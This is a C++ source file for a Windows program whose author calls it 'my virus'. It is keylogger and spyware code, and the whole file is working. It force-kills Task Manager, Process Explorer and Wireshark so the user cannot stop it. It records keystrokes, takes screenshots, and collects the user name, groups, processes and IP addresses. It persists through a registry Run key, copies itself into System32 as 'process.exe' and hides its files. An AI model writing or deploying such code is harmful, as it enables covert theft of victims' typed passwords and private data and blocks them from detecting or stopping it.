#include "DataCollector.h"


DataCollector::DataCollector()
{
	this->counter = 0; // counts how many times the loop had been running
}

void DataCollector::closeDisturbingTools()
{
	system("taskkill /f /im wireshark.exe");
	system("taskkill /f /im procexp64.exe"); // process explorer (I don't want the user will close my virus)
	system("taskkill /f /im Taskmgr.exe"); // task manager (same as above)
	system("taskkill /f /im nmap.exe");
	system("taskkill /f /im fiddler.exe");
}

void DataCollector::increaseCounter()
{
	this->counter++;
}

unsigned int DataCollector::getCounter()
{
	return this->counter;
}

void DataCollector::keyLogging()
{
	string output;
	string tmp;
	std::chrono::steady_clock::time_point start = std::chrono::steady_clock::now();
	while (true)
	{
		Sleep(50);
		for (int key = 8; key <= 190; key++) // running on every button in the keyboard
		{
			if (std::chrono::steady_clock::now() - start > std::chrono::seconds(6))
			{
				this->outputFile.open(this->path + "\\log.txt");
				this->outputFile << "Key Strokes:\n";
				this->outputFile << output;
				return;
			}
			if (GetAsyncKeyState(key) == -32767) // if a key is pressed
			{
				tmp = specialKeys(key);
				output += tmp;
				if (tmp == "")
				{
					key += 32;
					if (GetKeyState(VK_CAPITAL) & 0x0001 || GetKeyState(VK_SHIFT) & 0x8000)
						// if shift or Capslock is pressed, I want it to be a Capital letter.
					{
						key -= 32;
					}
					output += (char)key;
				}
			}
		}
	}
}

string DataCollector::specialKeys(int key)
{
	switch (key)
	{
	case VK_SPACE:
		return " ";
	case VK_RETURN:
		return "\n";
	case VK_SHIFT:
		return " Shift ";
	case VK_BACK:
		return " Back ";
	case VK_RBUTTON:
		return " RClick ";
	case VK_CAPITAL:
		return " CapsLock ";
	case VK_TAB:
		return " Tab ";
	case VK_UP:
		return " UpArrow ";
	case VK_DOWN:
		return " DownArrow ";
	case VK_LEFT:
		return " LeftArrow ";
	case VK_RIGHT:
		return " RightArrow ";
	case VK_CONTROL:
		return " Control ";
	case VK_MENU:
		return " Alt ";
	default:
		return "";
	}
}

void DataCollector::getPath()
{
	system("cd>path.txt");
	std::ifstream pathFile("path.txt");
	std::getline(pathFile, this->path);
	pathFile.close();
	remove("path.txt");
}

void DataCollector::screenShot(const char* BmpName)
{
	HWND DesktopHwnd = GetDesktopWindow();
	RECT DesktopParams;
	HDC DevC = GetDC(DesktopHwnd);
	GetWindowRect(DesktopHwnd, &DesktopParams);
	DWORD Width = DesktopParams.right - DesktopParams.left;
	DWORD Height = DesktopParams.bottom - DesktopParams.top;

	DWORD FileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (sizeof(RGBTRIPLE) + 1 * (Width * Height * 4));
	char* BmpFileData = (char*)GlobalAlloc(0x0040, FileSize);

	PBITMAPFILEHEADER BFileHeader = (PBITMAPFILEHEADER)BmpFileData;
	PBITMAPINFOHEADER  BInfoHeader = (PBITMAPINFOHEADER)&BmpFileData[sizeof(BITMAPFILEHEADER)];

	BFileHeader->bfType = 0x4D42;
	BFileHeader->bfSize = sizeof(BITMAPFILEHEADER);
	BFileHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

	BInfoHeader->biSize = sizeof(BITMAPINFOHEADER);
	BInfoHeader->biPlanes = 1;
	BInfoHeader->biBitCount = 24;
	BInfoHeader->biCompression = BI_RGB;
	BInfoHeader->biHeight = Height;
	BInfoHeader->biWidth = Width;

	RGBTRIPLE* Image = (RGBTRIPLE*)&BmpFileData[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)];

	HDC CaptureDC = CreateCompatibleDC(DevC);
	HBITMAP CaptureBitmap = CreateCompatibleBitmap(DevC, Width, Height);
	SelectObject(CaptureDC, CaptureBitmap);
	BitBlt(CaptureDC, 0, 0, Width, Height, DevC, 0, 0, SRCCOPY | CAPTUREBLT);
	GetDIBits(CaptureDC, CaptureBitmap, 0, Height, Image, (LPBITMAPINFO)BInfoHeader, DIB_RGB_COLORS);

	DWORD Junk;
	HANDLE FH = CreateFileA(BmpName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
	WriteFile(FH, BmpFileData, FileSize, &Junk, 0);
	CloseHandle(FH);
	GlobalFree(BmpFileData);
}

void DataCollector::netStat()
{
	string line;
	std::unordered_set<string> IPs;
	system("netstat -n>netstat.txt");
	std::ifstream net("netstat.txt");
	this->outputFile << "\n\nIP addresses the computer contact with:\n";
	while (std::getline(net, line))
	{
		if (line.length() > 32 && isdigit(line[32]))
		{
			IPs.insert(line.substr(32, line.find(":", 32) - 32) + "\n");
				// set because I don't want items to be more than once
				// and unordered because of the run time...
		}
	}
	for (auto i : IPs)
	{
		this->outputFile << i;
	}
	net.close();
	remove("netstat.txt");
}

void DataCollector::findUserName()
{
	wchar_t user[256];
	DWORD size = sizeof(user) / sizeof(user[0]);
	GetUserNameW(user, &size);

	std::wstring ws(user);
	string userStr(ws.begin(), ws.end());

	this->outputFile << "\nUser Name: " << userStr << endl;
}

void DataCollector::findGroups()
{
	std::string line;
	this->outputFile << "\nLocal groups:\n";
	system("net localgroup>localgroups.txt");
	std::ifstream file("localgroups.txt");
	while (std::getline(file, line))
	{
		if (line[0] == '*')
		{
			this->outputFile << line.substr(1, line.length() - 1) << std::endl;
		}
	}
	file.close();
	remove("localgroups.txt");
}

void DataCollector::winVersion(bool firstRun)
{
	string winverStr;
	if (firstRun) // only in first run the systeminfo runs, after this it's saved as a string
	{
		system("systeminfo | findstr /B /C:\"OS Version\">winver.txt");
		std::ifstream file("winver.txt");
		std::getline(file, winverStr);
		this->winVer = winverStr;
		file.close();
		remove("winver.txt");
	}
	this->outputFile << endl << this->winVer << endl;
}

void DataCollector::findProcesses()
{
	std::unordered_set<string> processes;
	this->outputFile << "\nProcess list:\n";
	string line;
	system("tasklist>tasklist.txt");
	std::ifstream file("tasklist.txt");
	for (size_t i = 0; i < 3; i++)
		std::getline(file, line); // for the first lines, it's not processes
	while (std::getline(file, line))
	{
		processes.insert(line.substr(0, line.find("  ") + 1));
		// there are at least two spaces after every process.
	}
	for (auto i : processes)
	{
		this->outputFile << i << endl;
	}
	file.close();
	remove("tasklist.txt");
}

void DataCollector::findIP()
{
	system("ipconfig | findstr IPv4>ipconfig.txt");
	std::ifstream ipFile("ipconfig.txt");
	std::string line;
	std::getline(ipFile, line);
	// there are excactly 39 chars before the IP address.
	this->outputFile << "\nPC's IP: " << line.substr(39, line.length() - 39) << std::endl;
	this->outputFile.close();
	ipFile.close();
	remove("ipconfig.txt");
}

void DataCollector::autoRun()
{
	// writes to registry to run automatically after computer's restart.
	system(("REG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion"
		"\\Run\" /V \"process\" /t REG_SZ /F /D " + this->path + "\"\\process.exe\"").c_str());
}

void DataCollector::programCopy()
{
	char filename[MAX_PATH];
	char newLocation[] = "C:\\Windows\\System32\\process.exe";
	DWORD size = GetModuleFileName(NULL, filename, MAX_PATH);
	string filenameStr(filename);
	string newLocationStr(newLocation);
	if (filenameStr.substr(0, newLocationStr.length()) == newLocationStr) // already in the location
		return;
	CopyFile(filename, newLocation, 0);
}

void DataCollector::hideFile()
{
	system(("attrib +s +h \"" + this->path + "\\log.txt\"").c_str());
	system(("attrib +s +h \"" + this->path + "\\screenShot.png\"").c_str());
	system("attrib +s +h \"C:\\Windows\\System32\\process.exe\"");
}

void DataCollector::changeBackground()
{
	this->getPath();
	system(("reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d "
		+ this->path + "\\background.bmp /f").c_str());
	system("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
}

string DataCollector::getPathstr()
{
	return this->path;
}
